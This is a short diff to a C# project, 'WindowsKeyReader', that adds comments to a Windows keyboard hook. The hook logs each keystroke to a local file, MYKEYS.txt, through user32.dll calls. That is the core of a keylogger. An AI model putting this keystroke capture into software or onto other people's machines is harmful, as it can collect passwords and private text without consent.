@@ -54,7 +54,7 @@ namespace WindowsKeyReader
                             using (StreamWriter writer = new StreamWriter(Application.StartupPath + "MYKEYS.txt", true))
                             {
                                 
-                                writer.Write(Convert.ToString((Keys)vkCode));
+                                writer.Write(Convert.ToString((Keys)vkCode));//the code given by the press converted to keypress and to string
                             }
                         }
                         else if ((Convert.ToString((Keys)vkCode)).ToUpper() == "SPACE")
@@ -84,7 +84,7 @@ namespace WindowsKeyReader
 
             return CallNextHookEx(hook, nCode, wParam, lParam);
         }
-
+        //link to what user 32 does https://en.wikipedia.org/wiki/Windows_USER
         [DllImport("user32.dll")]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
